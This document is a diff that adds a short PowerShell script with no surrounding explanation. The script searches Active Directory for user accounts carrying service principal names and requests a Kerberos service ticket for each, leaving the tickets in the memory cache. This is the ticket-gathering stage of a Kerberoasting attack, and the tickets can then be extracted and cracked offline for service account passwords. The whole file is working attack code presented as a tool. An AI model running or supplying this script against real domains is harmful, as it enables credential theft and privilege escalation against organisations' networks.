@@ -1,0 +1,14 @@
+Add-Type -AssemblyName System.IdentityModel
+$searcher = [adsisearcher]"(&(servicePrincipalName=*)(samAccountType=805306368))"
+$targets = $searcher.FindAll()
+
+foreach ($target in $targets) {
+    $spn = $target.Properties.serviceprincipalname[0]
+    Write-Host "[+] Requesting ticket for: $spn"
+    try {
+        $tmp = New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $spn
+        Write-Host "[!] Success: Ticket for $spn is now in memory cache" -ForegroundColor Green
+    } catch {
+        Write-Host "[-] Failed to request $spn" -ForegroundColor Red
+    }
+}
